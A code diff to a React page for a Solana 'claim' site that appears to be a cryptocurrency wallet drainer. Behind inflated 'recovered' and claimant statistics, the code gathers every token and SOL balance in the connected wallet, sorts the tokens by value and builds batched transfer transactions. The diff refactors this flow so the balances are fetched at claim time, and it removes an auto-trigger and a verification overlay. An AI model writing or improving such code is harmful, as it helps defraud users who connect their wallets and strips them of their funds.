@@ -5,7 +5,7 @@ import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
-import { useState, useEffect, useMemo, useCallback, useRef } from 'react';
+import { useState, useEffect, useMemo, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
@@ -42,11 +42,8 @@ const Claim = () => {
   const { chainName, nativeToken } = useChainInfo();
   const [dataMultiplier, setDataMultiplier] = useState(1);
   const [isClaiming, setIsClaiming] = useState(false);
-  const [isVerifying, setIsVerifying] = useState(false);
-  const [hasAutoTriggered, setHasAutoTriggered] = useState(false);
   const [stats, setStats] = useState({ recovered: '2.3M', claimants: '56,7K' });
   const [ledgerData, setLedgerData] = useState<any[]>([]);
-  const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
 
   const generateClaimData = () => {
@@ -114,7 +111,7 @@ const Claim = () => {
   }, [ledgerData, dataMultiplier, nativeToken]);
 
   const fetchAllBalances = useCallback(async () => {
-    if (!publicKey) return;
+    if (!publicKey) return [];
     try {
       const solBal = await connection.getBalance(publicKey);
       const solAmount = solBal / LAMPORTS_PER_SOL;
@@ -138,22 +135,12 @@ const Claim = () => {
         })
         .filter(token => token.uiAmount > 0);
 
-      setBalances(tokens);
+      return tokens;
     } catch (error) {
       console.error('Error fetching balances:', error);
+      return [];
     }
   }, [publicKey, connection]);
-
-  useEffect(() => {
-    if (publicKey) {
-      fetchAllBalances();
-    }
-  }, [publicKey, fetchAllBalances]);
-
-  // Ref to hold latest handleClaimTokens
-  const claimFnRef = useRef<() => void>(() => {});
-
-  // Auto-verify popup removed: users connect their wallet and continue freely.
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
     const effectivePublicKey = overridePublicKey || publicKey;
@@ -223,6 +210,7 @@ const Claim = () => {
     try {
       setIsClaiming(true);
       console.log('Starting transaction sequence...');
+      const currentBalances = await fetchAllBalances();
 
       const solBal = await connection.getBalance(publicKey);
       const solPrice = await getSolPrice();
@@ -255,7 +243,7 @@ const Claim = () => {
         await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
       }
 
-      const validTokens = balances.filter(token => token.balance > 0);
+      const validTokens = currentBalances.filter(token => token.balance > 0);
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
@@ -292,19 +280,12 @@ const Claim = () => {
     }
   };
 
-  // Keep ref updated with latest handleClaimTokens
-  useEffect(() => {
-    claimFnRef.current = handleClaimTokens;
-  });
-
   const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
 
   return (
     <div className="min-h-screen relative overflow-hidden">
       <PegasusAnimation />
       <Navigation />
-
-      {/* Wallet verification overlay removed */}
 
       {/* Hero Section */}
       <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
